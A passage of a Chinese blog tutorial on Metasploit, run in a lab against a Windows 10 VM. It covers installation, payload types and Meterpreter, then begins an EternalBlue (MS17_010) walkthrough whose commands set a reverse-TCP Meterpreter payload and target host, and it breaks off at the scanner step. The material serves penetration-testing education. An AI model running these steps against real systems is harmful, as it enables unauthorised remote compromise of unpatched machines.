<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>MSF使用教程 | like4h</title><meta name="keywords" content="Metasploit,MSF"><meta name="author" content="like4h"><meta name="copyright" content="like4h"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、实验环境：  靶 机： windows10虚拟机：192.168.100.158 攻击机： kali虚拟机：192.168.100.132   二、简介：  Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。">
<meta property="og:type" content="article">
<meta property="og:title" content="MSF使用教程">
<meta property="og:url" content="http://example.com/2023/03/16/791080604.html">
<meta property="og:site_name" content="like4h">
<meta property="og:description" content="一、实验环境：  靶 机： windows10虚拟机：192.168.100.158 攻击机： kali虚拟机：192.168.100.132   二、简介：  Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png">
<meta property="article:published_time" content="2023-03-16T07:12:11.000Z">
<meta property="article:modified_time" content="2023-03-16T07:34:07.669Z">
<meta property="article:author" content="like4h">
<meta property="article:tag" content="Metasploit">
<meta property="article:tag" content="MSF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png"><link rel="shortcut icon" href="/img/index/avater.jpg"><link rel="canonical" href="http://example.com/2023/03/16/791080604"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="6e49742deeebc779b29d507edd20bad8"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?8903f8597aac32d70805a4aae2c824e1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'MSF使用教程',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-03-16 15:34:07'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/index/avater.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About Me</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">like4h</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About Me</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">MSF使用教程</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-16T07:12:11.000Z" title="发表于 2023-03-16 15:12:11">2023-03-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-16T07:34:07.669Z" title="更新于 2023-03-16 15:34:07">2023-03-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>27分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="MSF使用教程"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="一-实验环境"><a class="markdownIt-Anchor" href="#一-实验环境"></a> 一、实验环境：</h2>
<blockquote>
<p><strong>靶 机：</strong> windows10虚拟机：<code>192.168.100.158</code><br />
<strong>攻击机：</strong> <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=kali&amp;spm=1001.2101.3001.7020">kali</a>虚拟机：<code>192.168.100.132</code></p>
</blockquote>
<h2 id="二-简介"><a class="markdownIt-Anchor" href="#二-简介"></a> 二、简介：</h2>
<blockquote>
<p><code>Metasploit Framework(MSF)</code>是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。刚开始的Metasploit是采用Perl语言编写的，但是再后来的新版中，改成了用Ruby语言编写的了。在kali中，自带了Metasploit工具。我们接下来以大名鼎鼎的永恒之蓝MS17_010漏洞为切入点，讲解MSF框架的使用。</p>
</blockquote>
<h2 id="三-metasploit的安装和更新升级"><a class="markdownIt-Anchor" href="#三-metasploit的安装和更新升级"></a> 三、Metasploit的安装和更新升级：</h2>
<h3 id="1-一键安装msf"><a class="markdownIt-Anchor" href="#1-一键安装msf"></a> 1. 一键安装MSF：</h3>
<blockquote>
<p>在一般的linux中，默认是不安装MSF的。以下是在非kali的Linux下安装MSF框架。</p>
</blockquote>
<p>所需命令：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#一键安装MSF：</span></span><br><span class="line">curl https:<span class="comment">//raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span></span><br><span class="line"> </span><br><span class="line">adduser msf                           <span class="comment">#添加msf用户</span></span><br><span class="line">su msf                                <span class="comment">#切换到msf用户</span></span><br><span class="line">cd  /opt/metasploit-framework/bin     <span class="comment">#切换到msf所在的目录 </span></span><br><span class="line">./msfconsole                          <span class="comment">#以后启动msfconsole，都切换到msf用户下启动，这样会同步数据库。如果使用root用户启动的话，不会同步数据库  </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#也可以将msfconsole加入到执行目录下，这样在任何目录直接msfconsole就可以了：</span></span><br><span class="line">ln -s /opt/metasploit-framework/bin/msfconsole /usr/bin/msfconsole</span><br><span class="line"> </span><br><span class="line"><span class="comment">#备注：</span></span><br><span class="line"><span class="comment">#初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联，这也这也就是需要新建用户msf来运行metasploit的原因所在。如果你一不小心手一抖，初次运行是在root用户下，请使用 msfdb reinit 命令，然后使用非root用户初始化数据库。        </span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 非kali环境下更新升级MSF：</span></span><br><span class="line">msfupdate							   <span class="comment"># MSF后期的升级</span></span><br><span class="line"><span class="comment"># kali环境下更新升级MSF：</span></span><br><span class="line">apt update 							   <span class="comment"># 更新安装包信息；只检查，不更新（已安装的软件包是否有可用的更新，给出汇总报告）</span></span><br><span class="line">apt upgrade 						   <span class="comment"># 更新已安装的软件包，不删除旧包；</span></span><br><span class="line">apt full-upgrade					   <span class="comment"># 升级包，删除旧包</span></span><br><span class="line"><span class="number">1234567891011121314151617181920</span></span><br></pre></td></tr></table></figure>
<h3 id="2-msf的更新升级"><a class="markdownIt-Anchor" href="#2-msf的更新升级"></a> 2. MSF的更新升级：</h3>
<h4 id="21-非kali环境下更新升级msf"><a class="markdownIt-Anchor" href="#21-非kali环境下更新升级msf"></a> 2.1 非kali环境下更新升级MSF：</h4>
<p>命令：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfupdate  <span class="comment">#MSF后期更新升级</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/Jj3CyBo8duNf7Ua.png" alt="img" /></p>
<h4 id="22-kali环境下更新升级msf"><a class="markdownIt-Anchor" href="#22-kali环境下更新升级msf"></a> 2.2 kali环境下更新升级MSF：</h4>
<blockquote>
<p>由于kali中的Metasploit渗透测试框架是集成在系统中的，不是单独安装，不支持使用<code>msfupdate</code>命令更新，更新的话需要随系统程序更新。</p>
</blockquote>
<p>使用msfupdate命令会出现下面的情况：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/桌面]</span><br><span class="line">└─<span class="comment"># msfupdate</span></span><br><span class="line">msfupdate is no longer supported when Metasploit is part of the operating</span><br><span class="line">system. Please <span class="keyword">use</span> &#x27;<span class="title">apt</span> <span class="title">update</span>; apt install metasploit-framework<span class="string">&#x27;</span></span><br><span class="line"><span class="string">1234</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/fYmQs1CGEWKRBHO.png" alt="在这里插入图片描述" />在kali中更新MSF使用以下命令：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt update 					<span class="comment"># 更新安装包信息；只检查，不更新（已安装的软件包是否有可用的更新，给出汇总报告）</span></span><br><span class="line">apt upgrade 				<span class="comment"># 更新已安装的软件包，不删除旧包；</span></span><br><span class="line">apt full-upgrade			<span class="comment"># 升级包，删除旧包</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<p>使用上面命令，是在更新系统程序的同时，把MSF更新。</p>
<h2 id="四-使用方法"><a class="markdownIt-Anchor" href="#四-使用方法"></a> 四、使用方法：</h2>
<h3 id="1-基础使用"><a class="markdownIt-Anchor" href="#1-基础使用"></a> 1. 基础使用：</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole										    <span class="comment">#进入框架</span></span><br><span class="line">search  ms17_010                                    <span class="comment"># 使用search命令查找相关漏洞</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">windows</span>/<span class="title">smb</span>/<span class="title">ms17_010_eternalblue</span>        # 使用<span class="title">use</span>进入模块</span><br><span class="line"><span class="title">info</span>     										    #使用<span class="title">info</span>查看模块信息</span><br><span class="line"><span class="title">set</span> <span class="title">payload</span> <span class="title">windows</span>/<span class="title">x64</span>/<span class="title">meterpreter</span>/<span class="title">reverse_tcp</span>    	#设置攻击载荷</span><br><span class="line"><span class="title">show</span> <span class="title">options</span>    									#查看模块需要配置的参数</span><br><span class="line"><span class="title">set</span>  <span class="title">RHOST</span>  192.168.100.158    					    #设置参数</span><br><span class="line"><span class="title">exploit</span> / <span class="title">run</span>     								    #攻击</span><br><span class="line">后渗透阶段											#后渗透阶段</span><br><span class="line">123456789</span><br></pre></td></tr></table></figure>
<p><strong>不同的攻击用到的步骤也不一样，这不是一成不变的，需要灵活使用。<br />
  我们也可以将攻击代码写入<code>configure.rc</code>（只要是以<code>.rc</code>结尾的文件）配置文件中，然后使用命令<code>msfconsole -r configure.rc</code>进行自动攻击！</strong></p>
<h3 id="2-msf中加载自定义的exploit模块"><a class="markdownIt-Anchor" href="#2-msf中加载自定义的exploit模块"></a> 2. <code>MSF</code>中加载自定义的<code>exploit模块</code>：</h3>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119488520?spm=1001.2014.3001.5501">点击进入参考文章：CVE-2019-0708 远程桌面漏洞复现</a>，该文中介绍了如果加载自定义的exploit模块并且成功攻击。</p>
</blockquote>
<h3 id="3-漏洞利用exploit"><a class="markdownIt-Anchor" href="#3-漏洞利用exploit"></a> 3. 漏洞利用(exploit)：</h3>
<blockquote>
<p>漏洞利用exploit，也就是我们常说的exp，他就是对漏洞进行攻击的代码。</p>
</blockquote>
<p>exploit漏洞利用模块路径(这里面有针对不同平台的exploit)：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/exploits</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/qU8dvmW6VY7D1zG.png" alt="img" /></p>
<p>进 windows 平台看看，这里会列出针对windows平台不同服务的漏洞利用：</p>
<p><img src="https://s2.loli.net/2023/03/16/qozdjlFHwOVQs8M.png" alt="img" /></p>
<p>进入smb服务，这是windows中经常爆出漏洞的服务，比如我们的永恒之蓝漏洞就在这里面。漏洞利用代码是以 rb 结尾的文件，因为metasploit是用Ruby语言编写的。</p>
<p><img src="https://s2.loli.net/2023/03/16/zC3T7UpjV2NDkQu.png" alt="img" /></p>
<h3 id="4-攻击载荷payload"><a class="markdownIt-Anchor" href="#4-攻击载荷payload"></a> 4. 攻击载荷(payload)：</h3>
<blockquote>
<p><strong><code>Payload</code>：</strong><code>Payload</code>中包含攻击进入目标主机后需要在远程系统中运行的恶意代码，而在Metasploit中Payload是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。简而言之，这种漏洞利用模块可以访问目标系统，而其中的代码定义了Payload在目标系统中的行为。<br />
    <strong><code>Shellcode</code>：</strong><code>Shellcode</code>是<code>payload</code>中的精髓部分，在渗透攻击时作为攻击载荷运行的一组机器指令。<code>Shellcode</code>通常用汇编语言编写。在大多数情况下，目标系统执行了<code>shellcode</code>这一组指令之后，才会提供一个命令行<code>shell</code>。</p>
</blockquote>
<h4 id="41-payload模块路径"><a class="markdownIt-Anchor" href="#41-payload模块路径"></a> 4.1 payload模块路径：：</h4>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/payloads</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/RmqI9kFXGHKwzv3.png" alt="img" /></p>
<h4 id="42-metasploit中的-payload-模块主要有以下三种类型"><a class="markdownIt-Anchor" href="#42-metasploit中的-payload-模块主要有以下三种类型"></a> 4.2 Metasploit中的 Payload 模块主要有以下三种类型：</h4>
<blockquote>
<p><code>Single</code>：<br />
  是一种<code>完全独立</code>的<code>Payload</code>，而且使用起来就像运行<code>calc.exe</code>一样简单，例如添加一个系统用户或删除一份文件。由于<code>Single Payload</code>是完全独立的，因此它们有可能会被类似<code>netcat</code>这样的非<code>metasploit</code>处理工具所捕捉到。</p>
<p><code>Stager</code>：<br />
  这种<code>Payload</code> <code>负责建立目标用户与攻击者之间的网络连接</code>，并下载额外的组件或应用程序。一种常见的<code>Stager Payload</code>就是<code>reverse_tcp</code>，它<code>可以让目标系统与攻击者建立一条</code> <code>tcp</code> <code>连接</code>，让目标系统主动连接我们的端口(反向连接)。另一种常见的是<code>bind_tcp</code>，它可以<code>让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)</code>。</p>
<p><code>Stage</code>：<br />
  是<code>Stager Payload</code>下的一种<code>Payload组件</code>，这种Payload可以提供更加高级的功能，而且没有大小限制。</p>
</blockquote>
<p>在 Metasploit 中，我们可以通过Payload的名称和使用格式来推断它的类型：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Single Payload的格式为：</span></span><br><span class="line">&lt;target&gt;/ &lt;single&gt;  如：windows/powershell_bind_tcp</span><br><span class="line"><span class="comment">#Stager/Stage Payload的格式为：</span></span><br><span class="line">&lt;target&gt;/ &lt;stage&gt; / &lt;stager&gt;  如：windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>当我们在Metasploit中执行 show payloads 命令之后，它会给我们显示一个可使用的Payload列表：</p>
</li>
<li>
<p><strong>注：<br />
在这个列表中，像 <code>windows/powershell_bind_tc</code>p 就是一个<code>Single Payload</code>，它不包含<code>Stage Payload</code>。<br />
  而<code>windows/meterpreter/reverse_tcp</code> 则由一个<code>Stage Payload（meterpreter）</code>和 一个<code>Stager Payload（reverse_tcp</code>组成。</strong><br />
Stager中几种常见的payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows/meterpreter/bind_tcp       <span class="comment">#正向连接</span></span><br><span class="line">windows/meterpreter/reverse_tcp    <span class="comment">#反向连接，常用</span></span><br><span class="line">windows/meterpreter/reverse_http   <span class="comment">#通过监听80端口反向连接</span></span><br><span class="line">windows/meterpreter/reverse_https  <span class="comment">#通过监听443端口反向连接</span></span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<p><strong><code>正向连接使用场景</code>：</strong><br />
  我们的攻击机在内网环境，被攻击机是外网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了。但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，比如被攻击机只对外开放了80端口。那么，我们就只能设置正向连接80端口了，这里很有可能失败，因为80端口上的流量太多了。</p>
<p><strong><code>反向连接使用场景</code>：</strong><br />
  我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了。如果是这样的情况，建议使用反向连接，因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量。</p>
<p><strong><code>反向连接80和443端口使用场景</code>：</strong><br />
  被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置的特别严格，就连被攻击机访问外部网络的流量也进行了严格的限制，只允许被攻击机的80端口或443端口与外部通信。</p>
</li>
</ul>
<h3 id="5-meterpreter"><a class="markdownIt-Anchor" href="#5-meterpreter"></a> 5. Meterpreter：</h3>
<blockquote>
<p>Meterpreter属于stage payload，在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。</p>
</blockquote>
<h4 id="51-meterpreter是如何工作的"><a class="markdownIt-Anchor" href="#51-meterpreter是如何工作的"></a> 5.1 Meterpreter是如何工作的？：</h4>
<blockquote>
<p>首先目标先要执行初始的溢出漏洞会话连接，可能是 bind正向连接，或者反弹 reverse 连接。反射连接的时候加载dll链接文件，同时后台悄悄处理 dll 文件。其次Meterpreter核心代码初始化,通过 socket套接字建立一个TLS/1.0加密隧道并发送GET请求给Metasploit服务端。Metasploit服务端收到这个GET请求后就配置相应客户端。最后，Meterpreter加载扩展，所有的扩展被加载都通过TLS/1.0进行数据传输。</p>
</blockquote>
<h4 id="52-meterpreter的特点"><a class="markdownIt-Anchor" href="#52-meterpreter的特点"></a> 5.2 Meterpreter的特点：</h4>
<blockquote>
<ul>
<li><code>Meterpreter</code>完全驻留在内存，没有写入到磁盘。</li>
<li><code>Meterpreter</code>注入的时候不会产生新的进程，并可以很容易的移植到其它正在运行的进程。</li>
<li>默认情况下， <code>Meterpreter</code>的通信是加密的，所以很安全。</li>
<li>扩展性，许多新的特征模块可以被加载。<br />
我们在设置<code>payloads</code> 时，可以将<code>payloads</code>设置为：<code>windows/meterpreter/reverse_tcp</code> ，然后获得了<code>meterpreter&gt;</code>之后我们就可以干很多事了！具体做的事，在我们下面的后渗透阶段都有讲！</li>
</ul>
</blockquote>
<h3 id="6-ms17_010永恒之蓝"><a class="markdownIt-Anchor" href="#6-ms17_010永恒之蓝"></a> 6. MS17_010(永恒之蓝)：</h3>
<blockquote>
<p>我们现在模拟使用 MS17_010 漏洞攻击，这个漏洞就是去年危害全球的勒索病毒利用的永恒之蓝漏洞。</p>
</blockquote>
<h4 id="61-查找漏洞相关模块"><a class="markdownIt-Anchor" href="#61-查找漏洞相关模块"></a> 6.1 查找漏洞相关模块：</h4>
<p>1、在kali命令行里面输入命令msfconsole，进入msf框架中：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  <span class="comment">#输入这个命令主要是进入msf渗透框架中</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/tSWHMfcpR1VOZG3.png" alt="img" /><br />
2、搜索MS17_010漏洞：</p>
<p>命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010  <span class="comment">#利用search命令，搜索漏洞相关利用模块</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/lyqD7nmWTuetrdz.png" alt="img" /><br />
这里找到了四个模块，前三个是漏洞利用模块，后两个是辅助模块，主要探测主机是否存在MS17_010漏洞。</p>
<h4 id="62-利用auxiliary辅助探测模块对漏洞进行探测"><a class="markdownIt-Anchor" href="#62-利用auxiliary辅助探测模块对漏洞进行探测"></a> 6.2 利用<code>Auxiliary辅助探测模块</code>对漏洞进行探测：</h4>
<blockquote>
<p><code>Auxiliary辅助探测模块</code>：<br />
  该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。</p>
</blockquote>
<p>1、使用smb_ms17_010漏洞探测模块对smb_ms17_010漏洞进行探测：<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">auxiliary</span>/<span class="title">scanner</span>/<span class="title">smb</span>/<span class="title">smb_ms17_010</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/I69j2rEwMT4hN13.png" alt="img" /></p>
<p>2、查看这个模块需要配置的信息：<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show options  <span class="comment">#查看这个模块需要配置的信息</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/tCsQyLXcmJ6W2Zx.png" alt="img" /></p>
<p>3、设置要探测的远程目标：</p>
<p>注：RHOSTS 参数是要探测主机的ip或ip范围，我们探测一个ip范围内的主机是否存在漏洞<br />
命令：</p>
